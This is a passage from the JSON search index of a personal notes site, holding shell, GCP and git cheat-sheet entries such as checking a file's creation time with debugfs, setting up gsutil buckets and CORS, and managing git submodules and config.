href=\"/notes/docs/docker/dockerfile/supervisord/supervisord.conf\"\u003esupervisord.conf\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003eservice with supervisord\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/supervisord/service_with_supervisord/Dockerfile\"\u003eDockerfile\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Docker docs"},{"categories":null,"contents":" File create time 1. Find Inode $ stat dns.yaml File: dns.yaml Size: 1003 Blocks: 8 IO Block: 4096 regular file Device: ca01h/51713d Inode: 3595636 Links: 1 Access: (0644/-rw-r--r--) Uid: ( 1000/ ubuntu) Gid: ( 1000/ ubuntu) Access: 2022-05-03 12:59:59.996755279 +0800 Modify: 2021-12-10 18:27:54.157585209 +0800 Change: 2022-01-07 14:57:58.619727878 +0800 Birth: - or\n$ ls -i dns.yaml 3585173 dns.yaml 2. Find Filesystem $ df dns.yaml Filesystem 1K-blocks Used Available Use% Mounted on /dev/root 101583780 25703988 75863408 26% / 3. Get Create Time $ sudo debugfs -R \u0026#39;stat \u0026lt;3595636\u0026gt;\u0026#39; /dev/root Inode: 3595636 Type: regular Mode: 0644 Flags: 0x80000 Generation: 449657737 Version: 0x00000000:00000001 User: 1000 Group: 1000 Project: 0 Size: 1003 File ACL: 0 Links: 1 Blockcount: 8 Fragment: Address: 0 Number: 0 Size: 0 ctime: 0x61d7e476:93c13018 -- Fri Jan 7 14:57:58 2022 atime: 0x6270b6cf:eda51d3c -- Tue May 3 12:59:59 2022 mtime: 0x61b32baa:25923ce4 -- Fri Dec 10 18:27:54 2021 crtime: 0x61b32baa:25923ce4 -- Fri Dec 10 18:27:54 2021 Size of extra inode fields: 32 Inode checksum: 0x5b176bb2 EXTENTS: (0):2665902 Display Ubuntu\u0026#39;s Message of the Day sudo chmod +x /etc/update-motd.d/* List domains sed \u0026#39;s/ //g\u0026#39; domains-info.md | awk -F \u0026#39;|\u0026#39; \u0026#39;{if($3 ~ /.*\\.com/)print $3}\u0026#39; | sort | uniq ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/bash/file/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eFile create time\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch4 id=\"1-find-inode\"\u003e1. Find Inode\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ stat dns.yaml\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  File: dns.yaml\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  Size: \u003cspan style=\"color:#ae81ff\"\u003e1003\u003c/span\u003e        Blocks: \u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e          IO Block: \u003cspan style=\"color:#ae81ff\"\u003e4096\u003c/span\u003e   regular file\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDevice: ca01h/51713d    Inode: \u003cspan style=\"color:#ae81ff\"\u003e3595636\u003c/span\u003e     Links: \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAccess: \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e0644/-rw-r--r--\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e  Uid: \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e 1000/  ubuntu\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e   Gid: \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e 1000/  ubuntu\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAccess: 2022-05-03 12:59:59.996755279 +0800\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eModify: 2021-12-10 18:27:54.157585209 +0800\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eChange: 2022-01-07 14:57:58.619727878 +0800\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e Birth: -\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eor\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ ls -i dns.yaml\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e3585173\u003c/span\u003e dns.yaml\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"2-find-filesystem\"\u003e2. Find Filesystem\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ df dns.yaml\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eFilesystem     1K-blocks     Used Available Use% Mounted on\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e/dev/root      \u003cspan style=\"color:#ae81ff\"\u003e101583780\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e25703988\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e75863408\u003c/span\u003e  26% /\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"3-get-create-time\"\u003e3. Get Create Time\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ sudo debugfs -R \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;stat \u0026lt;3595636\u0026gt;\u0026#39;\u003c/span\u003e /dev/root\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eInode: \u003cspan style=\"color:#ae81ff\"\u003e3595636\u003c/span\u003e   Type: regular    Mode:  \u003cspan style=\"color:#ae81ff\"\u003e0644\u003c/span\u003e   Flags: 0x80000\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eGeneration: \u003cspan style=\"color:#ae81ff\"\u003e449657737\u003c/span\u003e    Version: 0x00000000:00000001\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eUser:  \u003cspan style=\"color:#ae81ff\"\u003e1000\u003c/span\u003e   Group:  \u003cspan style=\"color:#ae81ff\"\u003e1000\u003c/span\u003e   Project:     \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e   Size: \u003cspan style=\"color:#ae81ff\"\u003e1003\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eFile ACL: \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLinks: \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e   Blockcount: \u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eFragment:  Address: \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e    Number: \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e    Size: \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e ctime: 0x61d7e476:93c13018 -- Fri Jan  \u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e 14:57:58 \u003cspan style=\"color:#ae81ff\"\u003e2022\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e atime: 0x6270b6cf:eda51d3c -- Tue May  \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e 12:59:59 \u003cspan style=\"color:#ae81ff\"\u003e2022\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e mtime: 0x61b32baa:25923ce4 -- Fri Dec \u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e 18:27:54 \u003cspan style=\"color:#ae81ff\"\u003e2021\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecrtime: 0x61b32baa:25923ce4 -- Fri Dec \u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e 18:27:54 \u003cspan style=\"color:#ae81ff\"\u003e2021\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSize of extra inode fields: \u003cspan style=\"color:#ae81ff\"\u003e32\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eInode checksum: 0x5b176bb2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eEXTENTS:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e0\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e:2665902\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eDisplay Ubuntu\u0026#39;s Message of the Day\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo chmod +x /etc/update-motd.d/*\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eList domains\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esed \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;s/ //g\u0026#39;\u003c/span\u003e domains-info.md | awk -F \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;|\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{if($3 ~ /.*\\.com/)print $3}\u0026#39;\u003c/span\u003e | sort | uniq\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"File Related Command"},{"categories":null,"contents":" monitoring # list gcloud alpha monitoring policies list --project=\u0026#34;project-prod-a\u0026#34; \u0026gt;project-prod-a.yaml # update gcloud alpha monitoring policies update --policy-from-file=\u0026#34;project-prod-a.yaml\u0026#34; \u0026#34;project-prod-a\u0026#34; cloud storage # Create bucket gsutil mb -c standard -l asia-east2 gs://prod-a gsutil iam ch allUsers:objectViewer gs://prod-a # Upload files gsutil -m rsync -x \u0026#34;.svn/\u0026#34; -u -d -r srcDir gs://prod-a gsutil -m cp downloads/*.csv gs://prod-a/data/ # Create CORS file cat \u0026lt;\u0026lt; EOF \u0026gt; /data/cors.json [ { \u0026#34;origin\u0026#34;: [\u0026#34;*\u0026#34;], \u0026#34;responseHeader\u0026#34;: [\u0026#34;Access-Control-Allow-Origin\u0026#34;], \u0026#34;method\u0026#34;: [\u0026#34;GET\u0026#34;,\u0026#34;HEAD\u0026#34;,\u0026#34;DELETE\u0026#34;], \u0026#34;maxAgeSeconds\u0026#34;: 3600 } ] EOF # Set CORS gsutil cors set /data/cors.json gs://prod-a/ # Check CORS gsutil cors get gs://prod-a/ # Purge CDN gcloud compute url-maps invalidate-cdn-cache balancer-client-prod-a --host ${} --path \u0026#34;/*\u0026#34; ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/gcp/command/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003emonitoring\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# list\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egcloud alpha monitoring policies list --project\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;project-prod-a\u0026#34;\u003c/span\u003e \u0026gt;project-prod-a.yaml\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# update\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egcloud alpha monitoring policies update --policy-from-file\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;project-prod-a.yaml\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;project-prod-a\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ecloud storage\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Create bucket\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egsutil mb -c standard -l asia-east2 gs://prod-a\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egsutil iam ch allUsers:objectViewer gs://prod-a\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Upload files\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egsutil -m rsync -x \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;.svn/\u0026#34;\u003c/span\u003e -u -d -r srcDir  gs://prod-a\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egsutil -m cp downloads/*.csv gs://prod-a/data/\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Create CORS file\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecat \u003cspan style=\"color:#e6db74\"\u003e\u0026lt;\u0026lt; EOF \u0026gt; /data/cors.json\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e[\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    \u0026#34;origin\u0026#34;: [\u0026#34;*\u0026#34;],\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    \u0026#34;responseHeader\u0026#34;: [\u0026#34;Access-Control-Allow-Origin\u0026#34;],\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    \u0026#34;method\u0026#34;: [\u0026#34;GET\u0026#34;,\u0026#34;HEAD\u0026#34;,\u0026#34;DELETE\u0026#34;],\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    \u0026#34;maxAgeSeconds\u0026#34;: 3600\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Set CORS\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egsutil cors set /data/cors.json gs://prod-a/\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Check CORS\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egsutil cors get gs://prod-a/\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Purge CDN\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egcloud compute url-maps invalidate-cdn-cache balancer-client-prod-a --host \u003cspan style=\"color:#e6db74\"\u003e${}\u003c/span\u003e --path \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/*\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"GCP Command"},{"categories":null,"contents":" Search in git git rev-list --all | xargs git grep -F \u0026#39;\u0026#39; Count commits git rev-list --count main View a file of another branch git show dev:main.go Take a backup of untracked files git ls-files --others --exclude-standard -z | xargs -0 tar rvf backup-untracked.zip Submodule # Add submodule git submodule add -b main git@github.com:linzeyan/toha.git themes/toha # Update submodule git submodule update --init --remote # Remove submodule modulePath=\u0026#34;themes/toha\u0026#34; git submodule deinit -f ${modulePath} git rm ${modulePath} rm -rf .git/modules/${modulePath} git config --remove-section submodule.${modulePath}. rm -f .gitmodules commit hash git rev-parse HEAD commit tag git describe --tags worktree # list git worktree list # add git worktree add ../dirname branch-name git config [user] email = zeyanlin@outlook.com name = Ricky signingkey = 2A4313489FDCA802ED6FCC214B03D879EA73DF37 [commit] gpgsign = true git config1 For golang import package\n[url \u0026#34;git@gitlab.example.com:\u0026#34;] insteadOf = https://gitlab.example.com/ git config2 [includeIf \u0026#34;gitdir:~/work/\u0026#34;] path = ~/.gitconfig-work remove big file in repository uv venv source .venv/bin/activate uv pip install git-filter-repo git filter-repo --force --strip-blobs-bigger-than 100M ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/bash/git/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eSearch in git\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit rev-list --all | xargs git grep -F \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eCount commits\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit rev-list --count main\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eView a file of another branch\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit show dev:main.go\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eTake a backup of untracked files\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit ls-files --others --exclude-standard -z | xargs -0 tar rvf backup-untracked.zip\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eSubmodule\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Add submodule\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit submodule add -b main git@github.com:linzeyan/toha.git themes/toha\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Update submodule\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit submodule update --init --remote\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Remove submodule\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emodulePath\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;themes/toha\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit submodule deinit -f \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003emodulePath\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit rm \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003emodulePath\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003erm -rf .git/modules/\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003emodulePath\u003cspan 